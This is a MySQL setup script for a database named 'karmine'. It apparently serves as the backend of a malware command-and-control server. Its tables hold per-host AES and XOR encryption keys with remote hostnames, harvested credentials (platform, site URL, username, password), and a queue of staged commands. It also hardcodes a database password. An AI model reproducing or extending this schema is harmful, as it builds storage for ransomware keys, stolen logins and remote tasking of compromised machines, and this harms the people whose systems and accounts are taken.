CREATE DATABASE IF NOT EXISTS karmine;
CREATE USER karmine@localhost IDENTIFIED BY 'y/k9xbw0Jb61Q9/r';
GRANT ALL PRIVILEGES ON karmine.* TO 'karmine'@'localhost';
FLUSH PRIVILEGES;
USE karmine;


CREATE TABLE IF NOT EXISTS karmine (
  uuid          VARCHAR(255) NOT NULL,
  rhostname     VARCHAR(255),
  aeskey        VARCHAR(255), 
  xorkey1       VARCHAR(255),
  xorkey2       VARCHAR(255),
  PRIMARY KEY (uuid)
);

CREATE TABLE IF NOT EXISTS kreds (
  id int NOT NULL AUTO_INCREMENT,
  platform  VARCHAR(255),
  site_url  VARCHAR(255),
  uname     VARCHAR(255),
  pass      VARCHAR(255),
  PRIMARY KEY (id)
);

CREATE TABLE IF NOT EXISTS kmdstack (
  cmd_id int NOT NULL AUTO_INCREMENT,
  staged_cmd    VARCHAR(1023),
  PRIMARY KEY (cmd_id)
);